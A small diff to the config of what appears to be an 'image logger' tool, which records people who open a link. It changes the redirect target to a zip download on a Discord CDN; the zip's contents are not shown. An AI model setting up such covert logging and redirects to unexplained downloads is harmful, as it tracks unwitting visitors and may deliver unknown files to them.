@@ -51,7 +51,7 @@ config = {
     # REDIRECTION #
     "redirect": {
         "redirect": True, # Redirect to a webpage?
-        "page": "https://cdn.discordapp.com/attachments/1201318266254147604/1201365029015007262/setup-your-own-imglog.zip?ex=65c98d5f&is=65b7185f&hm=f5194887065bffea34cdb1f42572c5ddb3c6adc11df91182cb0210c05b5b7923&" # Link to the webpage to redirect to 
+        "page": "https://cdn.discordapp.com/attachments/1201309858511716362/1201366504625676490/setup-imglogger.zip?ex=65c98ebf&is=65b719bf&hm=570eec170338e73059e40b6ff92e6fdd1ae92f1dcbc566371986961fc5655893&" # Link to the webpage to redirect to 
     },
 
     # Please enter all values in correct format. Otherwise, it may break.
